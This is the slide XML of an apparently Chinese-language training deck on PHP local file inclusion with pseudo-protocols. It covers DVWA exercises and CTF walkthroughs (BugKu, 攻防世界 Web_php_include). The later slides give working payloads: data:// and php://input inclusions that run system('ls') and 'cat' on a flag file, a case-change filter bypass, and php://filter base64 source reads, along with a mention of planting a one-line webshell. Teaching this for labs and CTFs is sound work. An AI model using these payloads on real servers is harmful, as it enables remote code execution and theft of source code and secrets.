            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="40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1164590" y="1394460"/>
            <a:ext cx="2193925" cy="923290"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/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环境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: DVWA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平台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（文件包含）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="160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6630" y="2400300"/>
            <a:ext cx="5402580" cy="10287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270" y="4762482"/>
            <a:ext cx="1304290" cy="130429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838700" y="4483100"/>
            <a:ext cx="57531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就是：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="6600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>读文件的！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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3.3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>data://</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea typeface="+mn-ea"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="爆炸形 1 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3084830" y="1439545"/>
            <a:ext cx="2144395" cy="1409700"/>
          </a:xfrm>
          <a:prstGeom prst="irregularSeal1">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/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>
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>数据流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549716" y="4403156"/>
            <a:ext cx="8642827" cy="131420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直接包含你输入的数据流！</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="6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372233" y="3443629"/>
            <a:ext cx="8820310" cy="58105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data://text/plain,</a:t>
            </a:r>
            <a:r>
              <a:rPr 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...  (...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是内容，比如&lt;?php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phpinfo();?&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr 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82995" y="1439545"/>
            <a:ext cx="4853940" cy="19183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/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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3.4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>php://</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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47370" y="1372235"/>
            <a:ext cx="7245350" cy="2080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sz="3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php:// 访问各个输入/输出流（I/O streams）</a:t>
            </a:r>
            <a:endParaRPr sz="36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（可能场景）在CTF中用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php://filter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读取源码，php://input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执行php代码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN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750560" y="3515920"/>
            <a:ext cx="5057140" cy="11350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php://input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==&gt; 可以访问请求的原始数据的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="24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只读流</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2400" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent4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751195" y="4947285"/>
            <a:ext cx="5647055" cy="96128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php://filter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==&gt; 是一种元封装器， 设计用于</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="20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数据流打开时的筛选过滤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应用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2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1"/>
      <p:bldP spid="5" grpId="0"/>
      <p:bldP spid="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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3.4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>php://</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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385435" y="4258705"/>
            <a:ext cx="6914992" cy="2080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若有写入权限，还可以写入各种内容（比如一句话木马等等）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" sz="36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sz="16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50570" y="1348815"/>
            <a:ext cx="4545330" cy="18302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eg1:</a:t>
            </a:r>
            <a:r>
              <a:rPr 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sz="4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php://input + [POST DATA]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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50473" y="1308515"/>
            <a:ext cx="5806953" cy="226485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50570" y="4008378"/>
            <a:ext cx="422284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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>读取你输入的数据流</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="6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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3.4</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>php://</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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48970" y="1155065"/>
            <a:ext cx="7271385" cy="2080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eg2:</a:t>
            </a:r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php://filter/read=convert.base64-encode/resource=[文件名]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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读取文件源码（针对php文件需要base64编码）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US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sz="16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57300" y="3146985"/>
            <a:ext cx="864870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/>
              <a:t>CTF</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0"/>
              <a:t>中为什么要用到</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4400" dirty="0"/>
              <a:t>filter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0"/>
              <a:t>？ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4400" dirty="0"/>
              <a:t>---</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0"/>
              <a:t>文件包含会把</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4400" dirty="0" err="1"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0"/>
              <a:t>文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>直接执行而非显示出来</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0"/>
              <a:t>，当我们需要</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>读取源码</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0"/>
              <a:t>的时候</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="4400" dirty="0"/>
              <a:t>filter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4400" dirty="0"/>
              <a:t>非常有用</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="4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3"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="4085313" y="3146996"/>
            <a:ext cx="4020393" cy="564015"/>
            <a:chOff x="4267200" y="1600200"/>
            <a:chExt cx="4336115" cy="766396"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="8" name="TextBox 4"/>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="5371430" y="1665097"/>
              <a:ext cx="3231885" cy="701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MY" sz="2800" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>平台</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>/</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="zh-CN" altLang="en-MY" sz="2800" dirty="0">
                  <a:latin typeface="+mn-ea"/>
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:rPr>
                <a:t>相关赛题复现</a:t>
              </a:r>
              <a:endParaRPr lang="zh-CN" altLang="en-MY" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="+mn-ea"/>
                <a:sym typeface="+mn-lt"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="9" name="Group 5"/>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="4267200" y="1600200"/>
              <a:ext cx="864870" cy="739140"/>
              <a:chOff x="4267199" y="1268631"/>
              <a:chExt cx="1373976" cy="1174236"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="10" name="Rectangle 6"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="4343867" y="1345299"/>
                <a:ext cx="1297308" cy="1097568"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
              <a:ln w="5715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3200" b="1" dirty="0">
                    <a:cs typeface="+mn-ea"/>
                    <a:sym typeface="+mn-lt"/>
                  </a:rPr>
                  <a:t>4</a:t>
                </a:r>
                <a:endParaRPr lang="en-MY" sz="3200" b="1" dirty="0">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="11" name="Right Triangle 7"/>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="5400000">
                <a:off x="4267199" y="1268631"/>
                <a:ext cx="455895" cy="455895"/>
              </a:xfrm>
              <a:prstGeom prst="rtTriangle">
                <a:avLst/>
              </a:prstGeom>
              <a:solidFill>
                <a:schemeClr val="accent2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en-MY">
                  <a:cs typeface="+mn-ea"/>
                  <a:sym typeface="+mn-lt"/>
                </a:endParaRPr>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grp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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>4.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>DVWA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>平台</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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928620" y="1835150"/>
            <a:ext cx="6087745" cy="1337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低中高三种难度的复现</a:t>
            </a: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备注</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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同时感受一下在中难度时，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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被过滤的情况；</a:t>
            </a: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高难度时，很多协议被过滤，只能用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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file://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的情况；</a:t>
            </a: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6500" y="3921125"/>
            <a:ext cx="1807845" cy="158813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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>4.2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>BugKu--Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>文件包含（入门）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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270" y="1426845"/>
            <a:ext cx="1844040" cy="126174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0560" y="1327150"/>
            <a:ext cx="4403090" cy="9048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0735" y="1856105"/>
            <a:ext cx="5966460" cy="11049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74625" y="3009265"/>
            <a:ext cx="556831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不能直接访问</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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index.php</a:t>
            </a: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的内容</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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~~</a:t>
            </a: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也没发现敏感文件</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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尝试搭配伪协议读取</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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index.php</a:t>
            </a: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源码的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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base64</a:t>
            </a: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编码</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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php://filter/read=convert.base64-encode/resource=</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="16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5750" y="2264410"/>
            <a:ext cx="4762500" cy="10287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3310" y="3545840"/>
            <a:ext cx="5234940" cy="98298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50" y="4256405"/>
            <a:ext cx="7400290" cy="21209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8610599" y="6248400"/>
            <a:ext cx="2909888" cy="206381"/>
          </a:xfrm>
        </p:spPr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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>4.3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> 攻防世界</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>--Web_php_include (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>进阶区</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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7370" y="1504315"/>
            <a:ext cx="2129790" cy="147383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370" y="3336290"/>
            <a:ext cx="4376420" cy="197485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923790" y="1304290"/>
            <a:ext cx="4878070" cy="2676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理解两个函数</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" sz="16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strstr()</a:t>
            </a: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函数能做啥？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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搜索字符串在另一字符串中是否存在</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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（区分大小写）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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True</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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则返回该字符串及剩余部分，反之</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="16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False</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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）str_replace</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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函数能做啥？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" alt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替换字符串中的一些字符（区分大小写）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent4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990465" y="4256405"/>
            <a:ext cx="5331460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所以这段</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN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php</a:t>
            </a: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代码的作用即是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php://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协议的过滤</a:t>
            </a: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那么？就可以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考虑利用其他方式，比如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data://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协议</a:t>
            </a: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zh-CN" alt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确实想用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php://</a:t>
            </a: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呢？当然也可以，从上面对两个函数的分析可知，我们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可利用大小写绕过这个过滤（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PHP://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6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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>4.3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>攻防世界</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>--Web_php_include (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>进阶区</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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43535" y="1181100"/>
            <a:ext cx="7187565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方法一</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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data://</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1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?page=data://text/plain, &lt;?php system("ls"); ?&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr 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endParaRPr sz="16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拿到敏感文件fl4gisisish3r3.php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?page=data://text/plain, &lt;?php system("cat fl4gisisish3r3.php"); ?&gt;</a:t>
            </a:r>
            <a:endParaRPr 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1175" y="1181100"/>
            <a:ext cx="6073140" cy="106680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343535" y="3328670"/>
            <a:ext cx="5689600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方法二</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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php://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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大小写绕过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="16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+ input [POST DATA]</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1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?page=Php://input</a:t>
            </a:r>
            <a:endParaRPr sz="16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sz="16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&lt;?php </a:t>
            </a:r>
            <a:endParaRPr sz="16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system("cat fl4gisisish3r3.php");</a:t>
            </a:r>
            <a:endParaRPr sz="16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?&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="16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1175" y="3194050"/>
            <a:ext cx="6507480" cy="257556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665" y="5450840"/>
            <a:ext cx="4625340" cy="7848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547687" y="0"/>
            <a:ext cx="10850563" cy="10287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394479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 dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>4.3</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>攻防世界</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>--Web_php_include (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>进阶区</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
                <a:sym typeface="+mn-ea"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="2800" dirty="0">
              <a:latin typeface="+mn-ea"/>
              <a:ea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4930" y="3646170"/>
            <a:ext cx="2821940" cy="132842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43535" y="1181100"/>
            <a:ext cx="8267065" cy="1938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方法三</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="16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php://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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大小写绕过</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="16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+ filter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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直接读敏感文件内容的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="16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base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="16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编码</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1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?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php</a:t>
            </a:r>
            <a:endParaRPr sz="16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读到的内容PD9waHAKJGZsYWc9ImN0Zns4NzZhNWZjYS05NmM2LTRjYmQtOTA3NS00NmYwYzg5NDc1ZDJ9IjsKPz4K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964930" y="2816225"/>
            <a:ext cx="2980055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其实还有很多种思路和方法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可以多多尝试，在实践中感受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~</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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535" y="3119120"/>
            <a:ext cx="8140065" cy="197866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535" y="5228590"/>
            <a:ext cx="9563100" cy="8763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进阶内容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669924" y="1387928"/>
            <a:ext cx="10850563" cy="4200071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394479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dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>1.Phar</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>伪协议利用</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>2.Iconv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>字符集编码</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>3.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>filter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>过滤器和</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>base64</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>解析特性绕过死亡</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>4.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>临时文件包含（如利用</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>SESSION</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>文件）</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN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+mn-ea"/>
                <a:ea typeface="+mn-ea"/>
              </a:rPr>
              <a:t>5.Pearcmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0">
                <a:latin typeface="+mn-ea"/>
